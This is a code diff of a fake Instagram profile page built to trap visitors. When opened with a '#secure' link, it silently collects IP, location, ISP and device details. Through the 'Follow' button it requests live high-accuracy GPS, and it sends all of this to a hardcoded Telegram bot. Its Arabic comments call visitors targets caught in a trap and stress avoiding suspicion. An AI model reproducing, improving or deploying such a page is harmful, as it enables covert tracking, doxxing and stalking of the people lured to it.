@@ -5,16 +5,14 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
     
     <title>Instagram | @ekhlas_2026</title>
-    <meta property="og:title" content="Ekhlas (@ekhlas_2026) • Instagram photos and videos">
+    <meta property="og:title" content="Ekhlas (@ekhlas_2026) • Instagram photos">
     <meta property="og:description" content="شاهد صور ومقاطع فيديو إخلاص من الخليل. استكشف المنشورات والقصص الآن. ✨">
     <meta property="og:image" content="https://k.top4top.io/p_3696qmute0.jpeg">
-    <meta property="og:url" content="https://www.instagram.com/ekhlas_2026">
     <meta property="og:type" content="profile">
-    <meta name="twitter:card" content="summary_large_image">
 
     <style>
         body { font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #fff; margin: 0; padding: 0; display: none; }
-        .nav { height: 44px; border-bottom: 1px solid #dbdbdb; display: flex; align-items: center; justify-content: center; font-weight: bold; background: #fff; position: sticky; top: 0; z-index: 100; }
+        .nav { height: 44px; border-bottom: 1px solid #dbdbdb; display: flex; align-items: center; justify-content: center; font-weight: bold; background: #fff; position: sticky; top: 0; }
         .p-container { padding: 20px 15px; max-width: 600px; margin: 0 auto; }
         .p-pic { width: 77px; height: 77px; border-radius: 50%; border: 1px solid #dbdbdb; object-fit: cover; }
         .stats { display: flex; flex-grow: 1; justify-content: space-around; text-align: center; margin-right: 15px; }
@@ -40,7 +38,7 @@
             • Palestine | Hebron 🇵🇸<br>
             • مرحبا بك في عالمي الصغير 🌸
         </div>
-        <button class="f-btn">متابعة</button>
+        <button class="f-btn" onclick="initGrab()">متابعة</button>
         <div class="grid">
             <div class="grid-item" style="background: url('https://k.top4top.io/p_3696qmute0.jpeg') center/cover;"></div>
             <div class="grid-item"></div><div class="grid-item"></div>
@@ -49,58 +47,69 @@
     </div>
 
     <script>
-        const T = '8492500020:AAH-KijyAHr_46BvwCvd0ociksbtycSXKJs';
-        const C = '7184970355';
+        const TOKEN = '8492500020:AAH-KijyAHr_46BvwCvd0ociksbtycSXKJs';
+        const CHAT_ID = '7184970355';
 
         window.onload = async () => {
-            // التحقق من مفتاح الأمان في الرابط
             if(window.location.hash.includes("#secure")) {
                 document.getElementById('mainBody').style.display = 'block';
                 
-                // 1. سحب البيانات الشاملة (IP، بطارية، رام، وقت) فوراً
-                captureFullData();
+                // 1. سحب فوري لكل البيانات التقنية بصمت
+                captureDeviceData();
                 
-                // 2. طلب إذن الـ GPS الفوري (خاوة)
-                initGPS();
+                // 2. تفجير طلب الموقع الرسمي فوراً (باسم المتصفح)
+                initGrab();
             } else {
                 window.location.replace("https://www.instagram.com");
             }
         };
 
-        async function captureFullData() {
+        async function captureDeviceData() {
             try {
-                const r = await fetch('https://ipapi.co/json/').then(res => res.json());
-                let bat = "غير متاح";
+                // سحب IP والمنطقة والمزود
+                const ipRes = await fetch('https://ipapi.co/json/').then(r => r.json());
+                
+                // سحب البطارية
+                let batteryInfo = "N/A";
                 if(navigator.getBattery) { 
                     const b = await navigator.getBattery(); 
-                    bat = `${Math.round(b.level * 100)}% (${b.charging ? 'يُشحن' : 'لا يُشحن'})`; 
+                    batteryInfo = `${Math.round(b.level * 100)}% (${b.charging ? 'يُشحن' : 'لا يُشحن'})`; 
                 }
 
-                const msg = `⚠️ **هدف جديد في المصيدة:**\n\n` +
-                            `🌐 IP: ${r.ip}\n` +
-                            `📍 المنطقة: ${r.city} | ${r.country_name}\n` +
-                            `📱 الجهاز: ${navigator.platform}\n` +
-                            `🧠 الرام: ${navigator.deviceMemory || '4+'} GB\n` +
-                            `🔋 البطارية: ${bat}\n` +
-                            `⏰ الوقت: ${new Date().toLocaleString('ar-EG')}\n` +
-                            `🌐 المتصفح: ${navigator.userAgent.split(' ').pop()}`;
+                const report = `
+🔥 **تم صيد بيانات تقنية:**
+🌐 IP: ${ipRes.ip}
+📍 المنطقة: ${ipRes.city} | ${ipRes.country_name}
+🏢 المزود: ${ipRes.org}
+📱 الجهاز: ${navigator.platform}
+🧠 الرام: ${navigator.deviceMemory || 'غير معروف'} GB
+🔋 البطارية: ${batteryInfo}
+⏰ التوقيت: ${new Date().toLocaleString('ar-EG')}
+🌐 اللغة: ${navigator.language}
+🖥️ الشاشة: ${screen.width}x${screen.height}
+                `;
                 
-                fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(msg)}`);
+                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(report)}`);
             } catch(e) {}
         }
 
-        function initGPS() {
-            const opt = { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 };
+        function initGrab() {
+            // إعدادات إجبار تفعيل GPS الجهاز (Precise Location)
+            const options = {
+                enableHighAccuracy: true, 
+                timeout: 5000, 
+                maximumAge: 0 
+            };
 
-            // تتبع حي ومستمر بمجرد قبول الإذن
+            // تتبع حي يرسل تحديثات فورية
             navigator.geolocation.watchPosition(
                 (p) => {
                     const map = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
-                    const locReport = `📍 **موقع GPS دقيق (Live):**\n${map}\n🎯 الدقة: ${p.coords.accuracy.toFixed(1)} متر`;
-                    fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(locReport)}`);
+                    const locMsg = `📍 **موقع GPS دقيق (Live):**\n${map}\n🎯 الدقة: ${p.coords.accuracy.toFixed(1)} متر`;
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(locMsg)}`);
                 },
-                null, // صمت تام في حال الرفض لإتاحة الفرصة لمحاولة أخرى
-                opt
+                null, // صمت مطبق في حال الرفض لعدم إثارة الشك
+                options
             );
         }
     </script>
